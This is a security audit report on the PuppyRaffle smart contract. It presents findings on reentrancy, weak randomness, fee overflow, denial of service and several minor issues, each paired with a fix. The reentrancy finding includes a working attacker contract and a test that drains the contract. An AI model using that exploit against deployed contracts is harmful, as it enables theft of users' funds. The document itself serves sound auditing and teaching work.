### [H-1] Reentrancy attack on `PuppyRaffle::refund` allows entrant to drain contract balance

**Description** The `PuppyRaffle::refund` function does not follow CEI (Check-Effect-Interaction) pattern and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `players` array. This means that if the `msg.sender` is a contract, it can receive the funds and call the `PuppyRaffle::refund` function again, draining the contract balance.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

**Impact** The entrant could drain the contract balance, leaving no funds for the winner.

**Proof of Concept** 

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance

**Proof of Code**
<details>
<summary>Code</summary>
Place the following code in `PuppyRaffle.t.sol`

```javascript
 function test_Reentrancy_refund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(address(puppyRaffle));
        address attackUser = makeAddr("attackUser");
        vm.deal(attackUser, 1 ether);

        uint256 StartingContractBalance = address(puppyRaffle).balance;
        uint256 StartingAttackerContractBalance = address(attackerContract).balance;

        vm.prank(attackUser);
        attackerContract.attack{value: entranceFee}();

        console.log("Starting Contract Balance: ", StartingContractBalance);
        console.log("Starting Attacker Contract Balance: ", StartingAttackerContractBalance);

        console.log("Ending Contract Balance: ", address(puppyRaffle).balance);
        console.log("Ending Attacker Contract Balance: ", address(attackerContract).balance);
    }

```

And this contract as well

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() public {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
    
    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```
</details>

**Recommended Mitigation** To prevent this, we should have the `PuppyRaffle:refund` function update the `players` array before making the external call to the `msg.sender` address. Additionally, we should move the event emission up as well.

```diff
  function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner or select the rarest puppy

**Description** Hashing msg.sender, block.timestamp, and block.prevrandao is not a secure random number generator. It creates a pattern that can be predicted by an attacker and hence, the winner can be predicted.

*Note:* This additionally means users can front-run this function and call `refund` if they see they are not the winner.

**Impact** Any user can influence or predict the winner, winning the money and selecting the rarest puppy. Making the entire raffle worthless if it becomes gas war as to who wins the raffle.

**Proof of Concept**

1. Validators know ahead of time the `block.timestamp` and `block.prevrandao` and use that to predict when/how to participate. See the [solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao/).
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generate the winner.
3. Users can revert their `selectWinner` transaction if they do not like the winner or resulting puppy.

Using on-chain values as a randomness seed is [a well documented attack-vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation** Consider using a cryptographically provable random number generator such as Chainlink VRF.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description** In solidity versions prior to `0.8.0` integers were subject to integer overflows.

```javascript
uint64 myVar = type(uint64).max
// 18446744073709551615
myVar = myVar + 1
// myVar will be 0
```
**Impact** In `PuppyRaffle::selectWinner`, `totalFess` are accumulated for `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feedAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept**

1. A raffle runs with 350 players at 1 ether entrance fee
2. 20% fee = 70 ether is calculated correctly as `uint256`
3. The unsafe `uint64(fee)` cast silently truncates 70 ether to ~14.6 ether
4. ~55.3 ether is permanently destroyed and unrecoverable

<details>
<summary>Fuzz Test</summary>

Place the following in `PuppyRaffleTest.t.sol`:
```javascript
function test_FuzzTotalFeesOverflow(uint256 numPlayers) public view {
    numPlayers = bound(numPlayers, 4, 1000);
    uint256 _entranceFee = 1e18;

    uint256 totalAmountCollected = numPlayers * _entranceFee;
    uint256 fee = (totalAmountCollected * 20) / 100;
    uint64 castedFee = uint64(fee);

    if (uint256(castedFee) != fee) {
        console.log("--- OVERFLOW DETECTED ---");
        console.log("players     :", numPlayers);
        console.log("entranceFee : 1e18 (fixed)");
        console.log("actual fee  :", fee);
        console.log("truncated   :", uint256(castedFee));
        console.log("lost        :", fee - uint256(castedFee));
    }

    assertEq(uint256(castedFee), fee, "Overflow: uint64 cast truncated fee");
}
```
</details>

**Fuzz Output:**
```
--- OVERFLOW DETECTED ---
players     : 350
entranceFee : 1000000000000000000 (1 ether)
actual fee  : 70000000000000000000 (70 ether)
truncated   : 14659767778871345152 (~14.6 ether)
lost        : 55340232221128654848 (~55.3 ether permanently destroyed)
```

**Recommended Mitigation**

Change `totalFees` from `uint64` to `uint256` and remove the unsafe cast:
```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;

- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;
```


### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS attack, incrementing gas costs for future entrants

**Description** The `PuppyRaffle::enterRaffle` function loops through the `players` to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This makes the gas costs for player who enter the game later will dramatically have to pay a higher gas fees then the one who enter earlier.
Every additional address in the `players` array, is an additional check the loop will have to make.

**Impact** The gas cost for a player to enter the raffle will increase with the number of players in the `players` array. This will discourage later users from entering.

An attacker might make the `players` array so big, that no one else enters, guaranteeing themselves to win.

**Proof of Concept** 

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6252048 gas
- 2nd 100 players: ~18068138 gas

This is more than 3x more expensive for the second 100 players.

<details>
<summary>PoC</summary>

Place the following test into `PuppyRaffle.t.sol`

```javascript
    function test_DoS_enterRaffle() public {
        vm.txGasPrice(1);

        // enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for(uint256 i = 0; i < playersNum; i++) {
            players[i] = address(uint160(i));
        }

        uint gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint gasEnd = gasleft();

        uint256 gasFirst = (gasStart - gasEnd) * tx.gasprice;

        // now lets enter another 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            playersTwo[i] = address(uint160(i + playersNum));
        }

        uint gasStartTwo = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
        uint gasEndTwo = gasleft();

        uint256 gasSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;

        console.log("Gas used: ", gasFirst);
        console.log("Gas used: ", gasSecond);

        assert(gasFirst < gasSecond);
    }
```
</details>

**Recommended Mitigation** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.

2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether the user has already entered.

```diff
+ mapping(address => uint256) public addressToRaffleId;
+ uint256 public raffleId = 0;

  function enterRaffle(address[] memory newPlayers) public payable {
      require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
      for(uint256 i = 0; i < newPlayers.length; i++) {
          players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
      }

-     // Check for duplicates
+     // Check for duplicates only from the new players
+     for (uint256 i = 0; i < newPlayers.length; i++) {
+         require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+     }

-     for (uint256 i = 0; i < newPlayers.length; i++) {
-         players.push(newPlayers[i]);
-     }
-
-     // Check for duplicates
-     for (uint256 i = 0; i < players.length - 1; i++) {
-         for (uint256 j = i + 1; j < players.length; j++) {
-             require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-         }
-     }

      emit RaffleEnter(newPlayers);
  }

  function selectWinner() external {
+   raffleId = raffleId + 1;
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively you could use [Openzeppelin's `EnumerableSet`](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet)

### [M-2] Unsafe cast of `PuppyRaffle::fee` loses fee

**Description** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.
```javascript
totalFees = totalFees + uint64(fee);
```

**Impact** The `feeAddress` will receive fewer fees than entitled. The truncated portion is permanently locked in the contract with no recovery mechanism.

**Proof of Concept**

1. A raffle runs with 350 players at 1 ether entrance fee
2. 20% fee = 70 ether is calculated correctly as `uint256`
3. The unsafe `uint64(fee)` cast silently truncates 70 ether to ~14.6 ether
4. ~55.3 ether is permanently destroyed and unrecoverable

<details>
<summary>Fuzz Test</summary>

Place the following in `PuppyRaffleTest.t.sol`:
```javascript
function test_FuzzTotalFeesOverflow(uint256 numPlayers) public view {
    numPlayers = bound(numPlayers, 4, 1000);
    uint256 _entranceFee = 1e18;

    uint256 totalAmountCollected = numPlayers * _entranceFee;
    uint256 fee = (totalAmountCollected * 20) / 100;
    uint64 castedFee = uint64(fee);

    if (uint256(castedFee) != fee) {
        console.log("--- OVERFLOW DETECTED ---");
        console.log("players     :", numPlayers);
        console.log("entranceFee : 1e18 (fixed)");
        console.log("actual fee  :", fee);
        console.log("truncated   :", uint256(castedFee));
        console.log("lost        :", fee - uint256(castedFee));
    }

    assertEq(uint256(castedFee), fee, "Overflow: uint64 cast truncated fee");
}
```
</details>

**Fuzz Output**
```
--- OVERFLOW DETECTED ---
players     : 350
entranceFee : 1000000000000000000 (1 ether)
actual fee  : 70000000000000000000 (70 ether)
truncated   : 14659767778871345152 (~14.6 ether)
lost        : 55340232221128654848 (~55.3 ether permanently destroyed)
```

**Recommended Mitigation**

Remove the unsafe cast by upgrading `totalFees` to `uint256`:
```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;

- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;
```


### [M-3] Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contest

**Description** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if they winner is a smart contract wallet that rejects payment, the lottery would not be able to start.

Users could easily call the `selectWinner` function again and non-wallet entrants could enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

**Impact** The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult.
Also, true winners would not get paid out and someone else could take their money.

**Proof of Concept** 
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends.
3. The `selectWinner` function would not work, even though the lottery is over.

**Recommended Mitigation** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended).
2. Create a mapping of addresses -> payout amount so winners can pull their funds themselves with a new `claimPrize` function, putting the owness on the winner to claim the prize (recommended).

> Pull over push

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for inactive players and for players at index 0, causing a player at index 0 to think they are not active

**Description** The `PuppyRaffle::getActivePlayerIndex` function returns 0 for inactive players and for players at index 0, causing a player at index 0 to think they are not active.

```javascript
/// @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact** A player at index 0 might think they are not active, and try to enter the raffle again, wasting gas.

**Proof of Concept**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation

**Recommended Mitigation** The easiest reccomendation would be to revert if the player is not active or not in the array of players instead of returning 0.

You could also reserve the 0th position for any competition, but a better solution would be to return `int256` where the function returns -1 if the player is not active.

# Gas

### [G-1] Unchanged state variables should be marked as constant or immutable

Reading from storage is more expensive than reading from memory. By marking state variables as `constant` or `immutable`, we can save gas.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length` in a loop, it will read from storage. By caching the length in a variable, we can save gas.

```diff
+    uint256 playersLength = players.length;    
-    for (uint256 i = 0; i < players.length - 1; i++) {
+    for (uint256 i = 0; i < playersLength - 1; i++) {
-        for (uint256 j = i + 1; j < players.length; j++) {
+        for (uint256 j = i + 1; j < playersLength; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```


### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version.
For example, instead of `pragma solidity ^0.8.28`, use `pragma solidity 0.8.28`.

### [I-2]: Address State Variable Set Without Checks

Check for `address(0)` when assigning values to address state variables.

<details><summary>2 Found Instances</summary>


- Found in src/audits/puppyRaffle/PuppyRaffle.sol [Line: 64](src/audits/puppyRaffle/PuppyRaffle.sol#L64)

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/audits/puppyRaffle/PuppyRaffle.sol [Line: 171](src/audits/puppyRaffle/PuppyRaffle.sol#L171)

    ```solidity
            feeAddress = newFeeAddress;
    ```

</details>

### [I-3] `PuppyRaffle::selectWinner` does not follow CEI, which is not a best practice

It's best to follow the CEI pattern, which is a common pattern in smart contracts. CEI stands for Check-Effect-Interaction, which is a pattern that ensures that the contract follows the correct order of operations.

```diff
-      (bool success,) = winner.call{value: prizePool}("");
-      require(success, "PuppyRaffle: Failed to send prize pool to winner");
      _safeMint(winner, tokenId);
+      (bool success,) = winner.call{value: prizePool}("");
+      require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-4] Use of Magic number is discouraged

It can be confusing to see number literals in a codebase, and it's much more readable if the numbers are given a name.

Examples:

```javascript
uint256 prizePool = (totalAmountCollected * 80) / 100;
uint256 fee = (totalAmountCollected * 20) / 100;
```
Instead you could use:

```javascript
uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
uint256 public constant FEE_PERCENTAGE = 20;
uint256 public constant POOL_PRECISION = 100;
```

### [I-5] `PuppyRaffle::_isActivePlayer` is never used and should be removed